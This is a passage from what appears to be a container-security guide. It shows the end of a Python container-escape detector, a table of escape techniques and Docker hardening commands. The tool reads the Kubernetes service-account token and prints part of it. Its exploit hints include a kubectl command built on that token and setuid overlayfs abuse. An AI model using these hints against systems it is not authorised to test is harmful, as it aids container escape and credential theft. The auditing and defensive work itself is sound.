                category="kernel",
                name="CVE-2022-0492 (cgroup v1 escape)",
                severity="HIGH",
                detected=True,
                description="Container escape via cgroup v1 release_agent possible",
                evidence=f"Current kernel: {kernel_version} < 5.17",
                exploit_hint="Exploitable with CAP_NET_ADMIN + unprivileged user namespace"
            ))

        # CVE-2023-0386: before 6.1
        if (major < 6) or (major == 6 and minor < 1):
            findings.append(Finding(
                category="kernel",
                name="CVE-2023-0386 (overlayfs NOSUID bypass)",
                severity="MEDIUM",
                detected=True,
                description="SUID bit preservation vulnerability in overlayfs upper directory",
                evidence=f"Current kernel: {kernel_version} < 6.1",
                exploit_hint="Create setuid file using user namespace + overlayfs combination"
            ))

    return findings


def check_seccomp_apparmor() -> list[Finding]:
    """Check Seccomp and AppArmor profile application"""
    findings: list[Finding] = []

    # Seccomp status
    try:
        with open("/proc/self/status") as f:
            status = f.read()
        seccomp_line = [l for l in status.splitlines() if l.startswith("Seccomp:")]
        if seccomp_line:
            seccomp_mode = int(seccomp_line[0].split()[1])
            modes = {0: "disabled", 1: "strict", 2: "filter"}
            mode_str = modes.get(seccomp_mode, "unknown")
            findings.append(Finding(
                category="seccomp",
                name="Seccomp Mode",
                severity="MEDIUM" if seccomp_mode == 0 else "INFO",
                detected=seccomp_mode == 0,
                description=f"Seccomp: {mode_str} (0=disabled, 1=strict, 2=filter)",
                evidence=f"Seccomp: {seccomp_mode} ({mode_str})",
                exploit_hint="Seccomp disabled → ptrace, keyctl, unshare etc. unrestricted" if seccomp_mode == 0 else ""
            ))
    except OSError:
        pass

    # AppArmor status
    aa_enabled = Path("/sys/kernel/security/apparmor/enabled")
    aa_profile = Path("/proc/self/attr/current")
    if aa_enabled.exists():
        try:
            enabled = aa_enabled.read_text().strip() == "Y"
            profile = aa_profile.read_text().strip() if aa_profile.exists() else "unknown"
            findings.append(Finding(
                category="apparmor",
                name="AppArmor Profile",
                severity="INFO" if enabled else "MEDIUM",
                detected=not enabled,
                description=f"AppArmor: {'enabled' if enabled else 'disabled'}, profile: {profile}",
                evidence=profile
            ))
        except OSError:
            pass

    return findings


def check_environment() -> list[Finding]:
    """Detect sensitive information in environment variables and files"""
    findings: list[Finding] = []

    sensitive_env_patterns = [
        "password", "passwd", "secret", "token", "key", "api_key",
        "aws_secret", "gcp_key", "azure", "db_pass", "database_url",
    ]

    env_findings: list[str] = []
    for key, val in os.environ.items():
        if any(pat in key.lower() for pat in sensitive_env_patterns):
            env_findings.append(f"{key}={'*' * min(len(val), 16)}")

    if env_findings:
        findings.append(Finding(
            category="environment",
            name="Sensitive Environment Variables",
            severity="HIGH",
            detected=True,
            description="Sensitive information present in environment variables",
            evidence="\n".join(env_findings)
        ))

    # K8s SA token file
    sa_token = Path("/var/run/secrets/kubernetes.io/serviceaccount/token")
    if sa_token.exists():
        token_content = sa_token.read_text().strip()
        findings.append(Finding(
            category="environment",
            name="Kubernetes SA Token",
            severity="MEDIUM",
            detected=True,
            description="ServiceAccount token is auto-mounted",
            evidence=f"{sa_token}: {token_content[:40]}...",
            exploit_hint="kubectl --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) get pods"
        ))

    return findings


# ── Comprehensive checks ──────────────────────────────────────────────────────

def run_all_checks(verbose: bool = False) -> list[Finding]:
    """Parallel check of all escape vectors"""
    check_functions = [
        ("capabilities", check_capabilities),
        ("namespaces", check_namespaces),
        ("cgroups", check_cgroups),
        ("mounts", check_mounts),
        ("kernel vulnerabilities", check_kernel_version),
        ("Seccomp/AppArmor", check_seccomp_apparmor),
        ("environment", check_environment),
    ]

    all_findings: list[Finding] = []

    with ThreadPoolExecutor(max_workers=7) as executor:
        futures = {
            executor.submit(fn): name
            for name, fn in check_functions
        }
        for future in as_completed(futures):
            category_name = futures[future]
            try:
                results = future.result()
                all_findings.extend(results)
                if verbose:
                    print(f"[*] {category_name} check complete: {len(results)} items")
            except Exception as e:
                print(f"[-] {category_name} check error: {e}")

    return all_findings


def print_findings(findings: list[Finding], only_detected: bool = False) -> None:
    """Print results"""
    severity_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
    sorted_findings = sorted(
        findings,
        key=lambda f: (severity_order.get(f.severity, 99), not f.detected)
    )

    detected = [f for f in sorted_findings if f.detected]
    not_detected = [f for f in sorted_findings if not f.detected]

    if detected:
        print(f"\n{'='*70}")
        print(f"Detected vulnerabilities/risks ({len(detected)} items)")
        print(f"{'='*70}")
        for f in detected:
            if only_detected and f.severity == "INFO":
                continue
            color_prefix = {
                "CRITICAL": "[CRITICAL]",
                "HIGH":     "[HIGH    ]",
                "MEDIUM":   "[MEDIUM  ]",
                "LOW":      "[LOW     ]",
                "INFO":     "[INFO    ]",
            }.get(f.severity, "[UNKNOWN ]")

            print(f"\n{color_prefix} {f.name}")
            print(f"  Category : {f.category}")
            print(f"  Desc     : {f.description}")
            if f.evidence:
                print(f"  Evidence : {f.evidence[:120]}")
            if f.exploit_hint:
                print(f"  Exploit  : {f.exploit_hint[:120]}")

    if not only_detected and not_detected:
        print(f"\n{'─'*70}")
        print(f"Normal items ({len(not_detected)} items)")
        for f in not_detected:
            if f.severity != "INFO":
                continue
            print(f"  [OK] {f.name}")

    # Summary
    critical = sum(1 for f in detected if f.severity == "CRITICAL")
    high = sum(1 for f in detected if f.severity == "HIGH")
    medium = sum(1 for f in detected if f.severity == "MEDIUM")
    print(f"\n{'='*70}")
    print(f"[Summary] {len(findings)} checks total | "
          f"CRITICAL:{critical} HIGH:{high} MEDIUM:{medium} | "
          f"Escape likelihood: {'High' if critical > 0 else 'Medium' if high > 0 else 'Low'}")


# ── CLI command handlers ──────────────────────────────────────────────────────

def cmd_check_all(args: argparse.Namespace) -> None:
    print("[*] Starting comprehensive container escape vector detection...\n")
    findings = run_all_checks(verbose=args.verbose)
    print_findings(findings, only_detected=args.only_detected)
    if args.output:
        data = [asdict(f) for f in findings]
        Path(args.output).write_text(json.dumps(data, indent=2, ensure_ascii=False))
        print(f"\n[+] Results saved: {args.output}")


def cmd_check_caps(args: argparse.Namespace) -> None:
    print("[*] Capability check\n")
    caps = get_process_capabilities()
    cap_eff = caps.get("CapEff", 0)
    cap_prm = caps.get("CapPrm", 0)

    decoded = decode_capabilities(cap_eff)
    print(f"CapEff: {cap_eff:#018x}")
    print(f"CapPrm: {cap_prm:#018x}\n")

    if not decoded:
        print("[+] No effective capabilities")
        return

    for cap in sorted(decoded, key=lambda c: c.severity):
        print(f"  [{cap.severity:8s}] {cap.cap_name:30s} - {cap.description}")


def cmd_check_namespaces(args: argparse.Namespace) -> None:
    print("[*] Namespace isolation check\n")
    findings = check_namespaces()
    print_findings(findings, only_detected=False)


def cmd_check_cgroups(args: argparse.Namespace) -> None:
    print("[*] cgroup security check\n")
    findings = check_cgroups()
    print_findings(findings, only_detected=False)


def cmd_check_mounts(args: argparse.Namespace) -> None:
    print("[*] Mount point security check\n")
    findings = check_mounts()
    print_findings(findings, only_detected=False)


def cmd_check_kernel(args: argparse.Namespace) -> None:
    print("[*] Kernel vulnerability check\n")
    findings = check_kernel_version()
    print_findings(findings, only_detected=False)


def cmd_report(args: argparse.Namespace) -> None:
    """Generate full report"""
    print("[*] Generating full security report...\n")
    findings = run_all_checks(verbose=True)

    report = {
        "system": {
            "hostname": socket.gethostname(),
            "kernel": platform.release(),
            "arch": platform.machine(),
            "pid": os.getpid(),
        },
        "summary": {
            "total_checks": len(findings),
            "critical": sum(1 for f in findings if f.detected and f.severity == "CRITICAL"),
            "high": sum(1 for f in findings if f.detected and f.severity == "HIGH"),
            "medium": sum(1 for f in findings if f.detected and f.severity == "MEDIUM"),
            "low": sum(1 for f in findings if f.detected and f.severity == "LOW"),
        },
        "findings": [asdict(f) for f in findings],
    }

    print_findings(findings, only_detected=False)

    output = args.output or "container_escape_report.json"
    Path(output).write_text(json.dumps(report, indent=2, ensure_ascii=False))
    print(f"\n[+] Report saved: {output}")


# ── argparse ──────────────────────────────────────────────────────────────────

def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="container_escape_detector",
        description="Automated container escape vulnerability detector",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s check-all
  %(prog)s check-all --only-detected --output findings.json
  %(prog)s check-caps
  %(prog)s check-namespaces
  %(prog)s check-cgroups
  %(prog)s check-mounts
  %(prog)s check-kernel
  %(prog)s report --output report.json
        """
    )
    sub = parser.add_subparsers(dest="command", required=True)

    # check-all
    p_all = sub.add_parser("check-all", help="Comprehensive check of all escape vectors")
    p_all.add_argument("--only-detected", action="store_true", help="Show only detected items")
    p_all.add_argument("--verbose", action="store_true", help="Verbose output")
    p_all.add_argument("--output", "-o", help="Output file (JSON)")

    # Individual checks
    sub.add_parser("check-caps", help="Capability check")
    sub.add_parser("check-namespaces", help="Namespace isolation check")
    sub.add_parser("check-cgroups", help="cgroup security check")
    sub.add_parser("check-mounts", help="Mount point check")
    sub.add_parser("check-kernel", help="Kernel vulnerability check")

    # report
    p_rep = sub.add_parser("report", help="Generate full security report")
    p_rep.add_argument("--output", "-o", default="container_escape_report.json")

    return parser


def main() -> None:
    parser = build_parser()
    args = parser.parse_args()

    dispatch = {
        "check-all": cmd_check_all,
        "check-caps": cmd_check_caps,
        "check-namespaces": cmd_check_namespaces,
        "check-cgroups": cmd_check_cgroups,
        "check-mounts": cmd_check_mounts,
        "check-kernel": cmd_check_kernel,
        "report": cmd_report,
    }

    handler = dispatch.get(args.command)
    if handler:
        handler(args)
    else:
        parser.print_help()


if __name__ == "__main__":
    main()
```

---

## 9. Escape Technique Comparison Summary

| Technique | Prerequisites | Success Rate | Detection Difficulty |
|-----------|--------------|--------------|----------------------|
| Privileged + cgroup release_agent | `--privileged` | Very High | Low |
| Docker socket mount | docker.sock mounted | Very High | Low |
| CVE-2019-5736 (runc overwrite) | runc < 1.0-rc7 | High | Medium |
| CAP_SYS_ADMIN + cgroupv1 | CAP_SYS_ADMIN | High | Medium |
| CVE-2022-0492 | < 5.17 kernel, cgroupv1 | Medium | High |
| hostPID + nsenter | `--pid=host` | High | Low |
| overlayfs CVE-2021-3493 | Ubuntu < 5.11.0-25 | Medium | High |
| userspace runc race condition | runc execution triggerable | Low | Very High |

---

## 10. Advanced Defenses

```bash
# 1. Use gVisor (runsc) - intercept syscalls
docker run --runtime=runsc nginx

# 2. Kata Containers - VM-level isolation
docker run --runtime=kata nginx

# 3. Create custom Seccomp profile
cat > /etc/docker/seccomp-strict.json << 'EOF'
{
  "defaultAction": "SCMP_ACT_ERRNO",
  "syscalls": [
    {"names": ["read","write","open","close","stat","exit","exit_group",
               "brk","mmap","munmap","access","execve","nanosleep"],
     "action": "SCMP_ACT_ALLOW"}
  ]
}
EOF
docker run --security-opt seccomp=/etc/docker/seccomp-strict.json nginx

# 4. Apply AppArmor profile
aa-genprof /usr/bin/myapp
docker run --security-opt apparmor=myapp-profile nginx

# 5. Switch to cgroupv2 (eliminates release_agent vulnerability)
# /etc/default/grub: GRUB_CMDLINE_LINUX="systemd.unified_cgroup_hierarchy=1"
update-grub && reboot

# 6. Read-only root + tmpfs combination
docker run \
  --read-only \
  --tmpfs /tmp:rw,noexec,nosuid \
  --tmpfs /run:rw,noexec,nosuid \
  nginx
```
